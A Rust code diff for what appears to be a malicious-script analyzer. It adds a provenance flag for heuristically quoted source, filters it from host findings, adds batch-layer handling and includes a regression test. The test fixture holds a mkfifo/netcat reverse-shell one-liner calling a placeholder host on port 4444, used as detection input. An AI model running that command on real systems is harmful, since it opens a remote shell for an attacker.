@@ -902,6 +902,20 @@ fn encoded_layer_finding(encoding: &str, offset: u64) -> Finding {
     }
 }
 
+/// Trusted provenance for this analysis unit, not a filename convention.
+pub(crate) const HEURISTIC_QUOTED_ORIGIN_ID: &str =
+    "metadata/lang/source/origin::heuristic-quoted-source";
+
+pub(crate) fn heuristic_quoted_origin_finding() -> Finding {
+    let mut finding = Finding::structural(
+        HEURISTIC_QUOTED_ORIGIN_ID.into(),
+        "Source parsed from heuristic quoted text".into(),
+        1.0,
+    );
+    finding.crit = Criticality::Baseline;
+    finding
+}
+
 /// Result of analyzing an embedded string
 #[derive(Debug)]
 pub enum EmbeddedAnalysisResult {
@@ -1000,6 +1014,8 @@ fn analyze_embedded_haystack(
         .without_embedded_detection();
     if is_encoded {
         analyzer = analyzer.with_encoded_context(encoding_chain.to_vec());
+    } else {
+        analyzer = analyzer.with_heuristic_quoted_context();
     }
 
     // Analyze in-memory.
@@ -1068,6 +1084,9 @@ fn analyze_embedded_haystack(
     } else {
         // Plain embedded code - return findings for parent
         let mut findings = report.findings;
+        // This flag belongs to the child evaluation. Copying it to the host
+        // would let an unrelated quoted snippet suppress real host behavior.
+        findings.retain(|finding| finding.id != HEURISTIC_QUOTED_ORIGIN_ID);
         findings.push(generate_embedded_language_trait(&file_type, offset, value));
 
         // Rewrite evidence to be parent-relative so the parent's
@@ -1733,13 +1752,21 @@ pub(crate) fn analyze_decoded_script_layer(
         encode_decoded_path(parent_path, &encoding_chain, offset as usize)
     };
 
-    let analyzer = UnifiedSourceAnalyzer::for_file_type(&file_type)?
-        .with_engine(engine.clone())
-        .without_embedded_detection()
-        .with_encoded_context(encoding_chain.clone());
     // Language comes from stng's deobfuscator (or the EncodedCommand
     // fallback), not the virtual path — force the grammar.
-    let mut report = analyzer.analyze_source_as_configured(Path::new(&virtual_path), decoded);
+    let mut report = if let Some(analyzer) = UnifiedSourceAnalyzer::for_file_type(&file_type) {
+        analyzer
+            .with_engine(engine.clone())
+            .without_embedded_detection()
+            .with_encoded_context(encoding_chain.clone())
+            .analyze_source_as_configured(Path::new(&virtual_path), decoded)
+    } else if file_type == FileType::Batch {
+        super::generic::GenericAnalyzer::new(file_type)
+            .with_engine(engine.clone())
+            .analyze_source_as_configured(Path::new(&virtual_path), decoded)
+    } else {
+        return None;
+    };
 
     if emit_encoded_powershell {
         report.findings.push(encoded_powershell_finding(
@@ -2274,6 +2301,52 @@ pub(crate) fn process_all_strings_with_host(
 mod tests {
     #![allow(clippy::unwrap_used, clippy::expect_used)]
     use super::*;
+
+    #[test]
+    fn heuristic_quoted_origin_is_filtered_before_plain_findings_reach_host() {
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join("traits.yaml");
+        std::fs::write(
+            &path,
+            r#"
+defaults:
+  for: [shell]
+  platforms: [unix, windows]
+traits:
+  - id: test/source::origin-probe
+    desc: Origin scope regression probe
+    crit: notable
+    if: {type: text, substr: mkfifo}
+    unless:
+      - id: metadata/lang/source/origin::heuristic-quoted-source
+"#,
+        )
+        .unwrap();
+        let mapper = crate::capabilities::CapabilityMapper::from_yaml(&path).unwrap();
+        let engine = crate::Engine::from_rules(std::sync::Arc::new(mapper));
+        let code = "mkfifo /tmp/f; sh -c 'sh </tmp/f | nc example.test 4444 >/tmp/f' 2>/dev/null";
+        let result = analyze_embedded_haystack(
+            "carrier.py",
+            code,
+            32,
+            &[],
+            Some(crate::types::binary::StringType::ShellCmd),
+            &engine,
+            0,
+            Some(&FileType::Python),
+        )
+        .unwrap();
+        let EmbeddedAnalysisResult::PlainEmbedded(findings) = result else {
+            panic!("plain string must remain a plain embedded unit");
+        };
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.id == "metadata/lang/embedded::shell")
+        );
+        assert!(!findings.iter().any(|f| f.id == HEURISTIC_QUOTED_ORIGIN_ID));
+        assert!(!findings.iter().any(|f| f.id == "test/source::origin-probe"));
+    }
 
     /// Script-deobfuscation layers name themselves from a closed set; each
     /// must be listed so its `metadata/lang/encoded/<name>` id validates.
